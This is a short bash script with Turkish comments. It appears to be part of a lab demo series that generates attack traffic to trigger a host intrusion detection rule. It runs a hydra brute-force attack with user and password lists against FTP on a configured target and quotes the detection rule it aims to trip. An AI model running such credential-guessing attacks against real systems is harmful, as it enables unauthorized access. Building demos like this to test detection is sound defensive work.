#!/usr/bin/env bash
# =============================================================================
# 05_brute_ftp.sh — hydra ile FTP (port 21) brute force.
#
# HIDS kuralı:  dst_port==21 && packets_last_sec >= 20  →  BruteForce
#
# FTP düz metin protokolüdür; deneme başına paket sayısı SSH'tan azdır, bu
# yüzden paket hızını 20–99/sn aralığında tutmak daha kolaydır → en TEMİZ
# BruteForce demo'su genellikle budur. (Kural sırası tuzağı için bkz.
# 04_brute_ssh.sh açıklaması.)
# =============================================================================
set -euo pipefail
source "$(dirname "$0")/config.sh"
require_tool hydra

THREADS="${THREADS:-4}"

banner "FTP Brute Force (hydra → port 21)" "BruteForce"
ping_check
echo "[bilgi] Kullanıcı listesi: $USERLIST   Parola listesi: $PASSLIST   Paralel: $THREADS"
countdown 3

hydra -L "$USERLIST" -P "$PASSLIST" -t "$THREADS" -f -I ftp://"$TARGET" || true

echo
echo "${C_GRN}[bitti]${C_RST} FTP brute force bitti. HIDS panosunda 'BruteForce' görmelisiniz."
